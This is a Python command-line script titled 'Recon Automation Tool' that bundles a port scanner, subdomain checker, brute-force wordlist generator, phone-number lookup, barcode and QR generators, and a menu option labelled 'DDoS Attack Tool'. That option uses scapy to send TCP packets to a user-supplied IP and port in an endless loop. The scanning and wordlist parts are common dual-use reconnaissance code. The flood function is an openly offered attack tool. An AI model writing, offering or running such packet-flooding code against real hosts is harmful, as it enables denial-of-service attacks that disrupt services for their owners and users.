import socket
import secrets
import string
import barcode
from barcode.writer import ImageWriter
import qrcode
from itertools import product
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import dns.resolver
from scapy.all import send, IP, TCP


# IP Scanner
def ip_scanner(ip):
    try:
        socket.gethostbyname(ip)
        return f"{ip} is live"
    except socket.error:
        return f"{ip} is not live"


# Port Scanner
def port_scanner(ip, ports):
    open_ports = []
    closed_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        else:
            closed_ports.append(port)
        sock.close()
    return open_ports, closed_ports


# Barcode Generator
def generate_barcode(data, filename):
    # Use Code128 for alphanumeric barcodes
    code128 = barcode.get('code128', data, writer=ImageWriter())
    code128.save(filename)
    print(f"Barcode saved as {filename}.png")


# QRCode Generator
def generate_qrcode(data, filename):
    # Automatically add .png extension if not provided
    if not filename.endswith('.png'):
        filename += '.png'
    img = qrcode.make(data)
    img.save(filename)
    print(f"QRCode saved as {filename}")


# Password Generator
def generate_password(length=12):
    alphabet = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(alphabet) for _ in range(length))


# Wordlist Generator
def generate_wordlist(charset, length):
    return [''.join(p) for p in product(charset, repeat=length)]


# Phone Number Information Gathering
def phone_info(number):
    phone_number = phonenumbers.parse(number)
    location = geocoder.description_for_number(phone_number, "en")
    carrier_name = carrier.name_for_number(phone_number, "en")
    timezones = timezone.time_zones_for_number(phone_number)
    return location, carrier_name, timezones


# Subdomain Checker
def check_subdomain(domain, subdomain):
    try:
        result = dns.resolver.resolve(f"{subdomain}.{domain}")
        return f"Subdomain found: {subdomain}.{domain}"
    except dns.resolver.NXDOMAIN:
        return f"Subdomain {subdomain}.{domain} does not exist"


# DDoS Attack Tool
def ddos_attack(target_ip, port):
    while True:
        send(IP(dst=target_ip)/TCP(dport=port), verbose=0)


# Main Interface
def main():
    while True:
        print("\nRecon Automation Tool")
        print("1. IP Scanner")
        print("2. Port Scanner")
        print("3. Barcode Generator")
        print("4. QRCode Generator")
        print("5. Password Generator")
        print("6. Wordlist Generator")
        print("7. Phone Number Info")
        print("8. Subdomain Checker")
        print("9. DDoS Attack Tool")
        print("10. Exit")
        
        choice = input("Choose an option: ")

        if choice == '1':
            ip = input("Enter IP address to scan: ")
            print(ip_scanner(ip))

        elif choice == '2':
            ip = input("Enter IP address to scan: ")
            ports = list(map(int, input("Enter ports to scan (comma-separated): ").split(',')))
            open_ports, closed_ports = port_scanner(ip, ports)
            print(f"Open Ports: {open_ports}")
            print(f"Closed Ports: {closed_ports}")

        elif choice == '3':
            data = input("Enter data for barcode: ")
            filename = input("Enter filename to save barcode: ")
            generate_barcode(data, filename)
            print(f"Barcode saved as {filename}.png")

        elif choice == '4':
            data = input("Enter data for QRCode: ")
            filename = input("Enter filename to save QRCode: ")
            generate_qrcode(data, filename)
            print(f"QRCode saved as {filename}.png")

        elif choice == '5':
            length = int(input("Enter password length: "))
            password = generate_password(length)
            print(f"Generated password: {password}")

        elif choice == '6':
            charset = input("Enter characters to use for wordlist: ")
            length = int(input("Enter word length: "))
            wordlist = generate_wordlist(charset, length)
            print(f"Generated Wordlist: {wordlist}")

        elif choice == '7':
            number = input("Enter phone number with country code: ")
            location, carrier_name, timezones = phone_info(number)
            print(f"Location: {location}")
            print(f"Carrier: {carrier_name}")
            print(f"Timezones: {', '.join(timezones)}")

        elif choice == '8':
            domain = input("Enter domain: ")
            subdomain = input("Enter subdomain to check: ")
            result = check_subdomain(domain, subdomain)
            print(result)

        elif choice == '9':
            target_ip = input("Enter target IP: ")
            port = int(input("Enter port: "))
            print("Starting DDoS Attack...")
            ddos_attack(target_ip, port)

        elif choice == '10':
            print("Exiting the tool...")
            break

        else:
            print("Invalid choice. Please try again.")


if __name__ == "__main__":
    main()
